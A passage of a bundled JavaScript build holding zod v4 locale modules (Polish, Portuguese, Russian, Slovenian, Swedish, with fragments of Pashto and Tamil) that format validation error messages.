          return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue3.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631\u0648\u0646\u0647"} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue3.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} \u0648\u064A`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} \u0648\u064A`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.prefix}" \u0633\u0631\u0647 \u067E\u06CC\u0644 \u0634\u064A`;
        }
        if (_issue.format === "ends_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.suffix}" \u0633\u0631\u0647 \u067E\u0627\u06CC \u062A\u0647 \u0648\u0631\u0633\u064A\u0696\u064A`;
        }
        if (_issue.format === "includes") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F "${_issue.includes}" \u0648\u0644\u0631\u064A`;
        }
        if (_issue.format === "regex") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F ${_issue.pattern} \u0633\u0631\u0647 \u0645\u0637\u0627\u0628\u0642\u062A \u0648\u0644\u0631\u064A`;
        }
        return `${Nouns[_issue.format] ?? issue3.format} \u0646\u0627\u0633\u0645 \u062F\u06CC`;
      }
      case "not_multiple_of":
        return `\u0646\u0627\u0633\u0645 \u0639\u062F\u062F: \u0628\u0627\u06CC\u062F \u062F ${issue3.divisor} \u0645\u0636\u0631\u0628 \u0648\u064A`;
      case "unrecognized_keys":
        return `\u0646\u0627\u0633\u0645 ${issue3.keys.length > 1 ? "\u06A9\u0644\u06CC\u0689\u0648\u0646\u0647" : "\u06A9\u0644\u06CC\u0689"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0646\u0627\u0633\u0645 \u06A9\u0644\u06CC\u0689 \u067E\u0647 ${issue3.origin} \u06A9\u06D0`;
      case "invalid_union":
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
      case "invalid_element":
        return `\u0646\u0627\u0633\u0645 \u0639\u0646\u0635\u0631 \u067E\u0647 ${issue3.origin} \u06A9\u06D0`;
      default:
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
    }
  };
};
function ps_default2() {
  return {
    localeError: error77()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/pl.js
var error78 = () => {
  const Sizable = {
    string: { unit: "znak\xF3w", verb: "mie\u0107" },
    file: { unit: "bajt\xF3w", verb: "mie\u0107" },
    array: { unit: "element\xF3w", verb: "mie\u0107" },
    set: { unit: "element\xF3w", verb: "mie\u0107" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "liczba";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tablica";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "wyra\u017Cenie",
    email: "adres email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i godzina w formacie ISO",
    date: "data w formacie ISO",
    time: "godzina w formacie ISO",
    duration: "czas trwania ISO",
    ipv4: "adres IPv4",
    ipv6: "adres IPv6",
    cidrv4: "zakres IPv4",
    cidrv6: "zakres IPv6",
    base64: "ci\u0105g znak\xF3w zakodowany w formacie base64",
    base64url: "ci\u0105g znak\xF3w zakodowany w formacie base64url",
    json_string: "ci\u0105g znak\xF3w w formacie JSON",
    e164: "liczba E.164",
    jwt: "JWT",
    template_literal: "wej\u015Bcie"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${issue3.expected}, otrzymano ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${stringifyPrimitive2(issue3.values[0])}`;
        return `Nieprawid\u0142owa opcja: oczekiwano jednej z warto\u015Bci ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Za du\u017Ca warto\u015B\u0107: oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt du\u017C(y/a/e): oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Za ma\u0142a warto\u015B\u0107: oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue3.minimum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt ma\u0142(y/a/e): oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zaczyna\u0107 si\u0119 od "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi ko\u0144czy\u0107 si\u0119 na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zawiera\u0107 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi odpowiada\u0107 wzorcowi ${_issue.pattern}`;
        return `Nieprawid\u0142ow(y/a/e) ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Nieprawid\u0142owa liczba: musi by\u0107 wielokrotno\u015Bci\u0105 ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nierozpoznane klucze${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Nieprawid\u0142owy klucz w ${issue3.origin}`;
      case "invalid_union":
        return "Nieprawid\u0142owe dane wej\u015Bciowe";
      case "invalid_element":
        return `Nieprawid\u0142owa warto\u015B\u0107 w ${issue3.origin}`;
      default:
        return `Nieprawid\u0142owe dane wej\u015Bciowe`;
    }
  };
};
function pl_default2() {
  return {
    localeError: error78()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/pt.js
var error79 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "ter" },
    file: { unit: "bytes", verb: "ter" },
    array: { unit: "itens", verb: "ter" },
    set: { unit: "itens", verb: "ter" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "n\xFAmero";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "nulo";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "padr\xE3o",
    email: "endere\xE7o de e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "dura\xE7\xE3o ISO",
    ipv4: "endere\xE7o IPv4",
    ipv6: "endere\xE7o IPv6",
    cidrv4: "faixa de IPv4",
    cidrv6: "faixa de IPv6",
    base64: "texto codificado em base64",
    base64url: "URL codificada em base64",
    json_string: "texto JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Tipo inv\xE1lido: esperado ${issue3.expected}, recebido ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entrada inv\xE1lida: esperado ${stringifyPrimitive2(issue3.values[0])}`;
        return `Op\xE7\xE3o inv\xE1lida: esperada uma das ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Muito grande: esperado que ${issue3.origin ?? "valor"} tivesse ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Muito grande: esperado que ${issue3.origin ?? "valor"} fosse ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Muito pequeno: esperado que ${issue3.origin} tivesse ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Muito pequeno: esperado que ${issue3.origin} fosse ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Texto inv\xE1lido: deve come\xE7ar com "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Texto inv\xE1lido: deve terminar com "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Texto inv\xE1lido: deve incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Texto inv\xE1lido: deve corresponder ao padr\xE3o ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} inv\xE1lido`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: deve ser m\xFAltiplo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Chave${issue3.keys.length > 1 ? "s" : ""} desconhecida${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Chave inv\xE1lida em ${issue3.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido em ${issue3.origin}`;
      default:
        return `Campo inv\xE1lido`;
    }
  };
};
function pt_default2() {
  return {
    localeError: error79()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ru.js
function getRussianPlural2(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error80 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0438\u043C\u0432\u043E\u043B",
        few: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430",
        many: "\u0441\u0438\u043C\u0432\u043E\u043B\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u0430",
        many: "\u0431\u0430\u0439\u0442"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0447\u0438\u0441\u043B\u043E";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0441\u0438\u0432";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0438 \u0432\u0440\u0435\u043C\u044F",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u044F",
    duration: "ISO \u0434\u043B\u0438\u0442\u0435\u043B\u044C\u043D\u043E\u0441\u0442\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64",
    base64url: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64url",
    json_string: "JSON \u0441\u0442\u0440\u043E\u043A\u0430",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0432\u043E\u0434"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${issue3.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0430\u0440\u0438\u0430\u043D\u0442: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C \u043E\u0434\u043D\u043E \u0438\u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const maxValue = Number(issue3.maximum);
          const unit = getRussianPlural2(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue3.maximum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const minValue = Number(issue3.minimum);
          const unit = getRussianPlural2(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue3.minimum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u043D\u0430\u0447\u0438\u043D\u0430\u0442\u044C\u0441\u044F \u0441 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0437\u0430\u043A\u0430\u043D\u0447\u0438\u0432\u0430\u0442\u044C\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u0434\u0435\u0440\u0436\u0430\u0442\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u043E\u0432\u0430\u0442\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0447\u0438\u0441\u043B\u043E: \u0434\u043E\u043B\u0436\u043D\u043E \u0431\u044B\u0442\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u043E\u0437\u043D\u0430\u043D\u043D${issue3.keys.length > 1 ? "\u044B\u0435" : "\u044B\u0439"} \u043A\u043B\u044E\u0447${issue3.keys.length > 1 ? "\u0438" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043A\u043B\u044E\u0447 \u0432 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435 \u0432 ${issue3.origin}`;
      default:
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435`;
    }
  };
};
function ru_default2() {
  return {
    localeError: error80()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/sl.js
var error81 = () => {
  const Sizable = {
    string: { unit: "znakov", verb: "imeti" },
    file: { unit: "bajtov", verb: "imeti" },
    array: { unit: "elementov", verb: "imeti" },
    set: { unit: "elementov", verb: "imeti" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0161tevilo";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tabela";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "vnos",
    email: "e-po\u0161tni naslov",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum in \u010Das",
    date: "ISO datum",
    time: "ISO \u010Das",
    duration: "ISO trajanje",
    ipv4: "IPv4 naslov",
    ipv6: "IPv6 naslov",
    cidrv4: "obseg IPv4",
    cidrv6: "obseg IPv6",
    base64: "base64 kodiran niz",
    base64url: "base64url kodiran niz",
    json_string: "JSON niz",
    e164: "E.164 \u0161tevilka",
    jwt: "JWT",
    template_literal: "vnos"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Neveljaven vnos: pri\u010Dakovano ${issue3.expected}, prejeto ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Neveljaven vnos: pri\u010Dakovano ${stringifyPrimitive2(issue3.values[0])}`;
        return `Neveljavna mo\u017Enost: pri\u010Dakovano eno izmed ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Preveliko: pri\u010Dakovano, da bo ${issue3.origin ?? "vrednost"} imelo ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementov"}`;
        return `Preveliko: pri\u010Dakovano, da bo ${issue3.origin ?? "vrednost"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Premajhno: pri\u010Dakovano, da bo ${issue3.origin} imelo ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Premajhno: pri\u010Dakovano, da bo ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Neveljaven niz: mora se za\u010Deti z "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Neveljaven niz: mora se kon\u010Dati z "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neveljaven niz: mora vsebovati "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neveljaven niz: mora ustrezati vzorcu ${_issue.pattern}`;
        return `Neveljaven ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Neveljavno \u0161tevilo: mora biti ve\u010Dkratnik ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Neprepoznan${issue3.keys.length > 1 ? "i klju\u010Di" : " klju\u010D"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Neveljaven klju\u010D v ${issue3.origin}`;
      case "invalid_union":
        return "Neveljaven vnos";
      case "invalid_element":
        return `Neveljavna vrednost v ${issue3.origin}`;
      default:
        return "Neveljaven vnos";
    }
  };
};
function sl_default2() {
  return {
    localeError: error81()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/sv.js
var error82 = () => {
  const Sizable = {
    string: { unit: "tecken", verb: "att ha" },
    file: { unit: "bytes", verb: "att ha" },
    array: { unit: "objekt", verb: "att inneh\xE5lla" },
    set: { unit: "objekt", verb: "att inneh\xE5lla" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "antal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "lista";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "regulj\xE4rt uttryck",
    email: "e-postadress",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datum och tid",
    date: "ISO-datum",
    time: "ISO-tid",
    duration: "ISO-varaktighet",
    ipv4: "IPv4-intervall",
    ipv6: "IPv6-intervall",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodad str\xE4ng",
    base64url: "base64url-kodad str\xE4ng",
    json_string: "JSON-str\xE4ng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "mall-literal"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ogiltig inmatning: f\xF6rv\xE4ntat ${issue3.expected}, fick ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ogiltig inmatning: f\xF6rv\xE4ntat ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ogiltigt val: f\xF6rv\xE4ntade en av ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `F\xF6r stor(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element"}`;
        }
        return `F\xF6r stor(t): f\xF6rv\xE4ntat ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Ogiltig str\xE4ng: m\xE5ste b\xF6rja med "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Ogiltig str\xE4ng: m\xE5ste sluta med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ogiltig str\xE4ng: m\xE5ste inneh\xE5lla "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ogiltig str\xE4ng: m\xE5ste matcha m\xF6nstret "${_issue.pattern}"`;
        return `Ogiltig(t) ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ogiltigt tal: m\xE5ste vara en multipel av ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ok\xE4nda nycklar" : "Ok\xE4nd nyckel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ogiltig nyckel i ${issue3.origin ?? "v\xE4rdet"}`;
      case "invalid_union":
        return "Ogiltig input";
      case "invalid_element":
        return `Ogiltigt v\xE4rde i ${issue3.origin ?? "v\xE4rdet"}`;
      default:
        return `Ogiltig input`;
    }
  };
};
function sv_default2() {
  return {
    localeError: error82()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ta.js
var error83 = () => {
  const Sizable = {
